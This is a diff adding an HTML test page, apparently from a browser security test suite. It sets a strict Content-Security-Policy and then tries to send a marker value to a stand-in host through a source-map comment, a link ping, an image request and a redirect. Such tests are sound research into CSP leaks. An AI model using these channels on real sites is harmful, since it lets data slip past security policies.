@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; connect-src 'self'"></script>
+</head>
+<body>
+    <script>
+        document.write(`<script>//# sourceMappingURL=https://b.test/report/?leak=c661126</script>`);
+
+        var a = document.createElement('a');
+        a.href = '#';
+        a.ping = `//b.test/report/?leak=c661126`;
+        a.click();
+    </script>
+
+    <img src="https://b.test/report/?status=204&leak=c661126" alt="">
+
+    <script>
+        location.href = `https://www.google.com/csi?leak=c661126`;
+    </script>
+</body>
+</html>
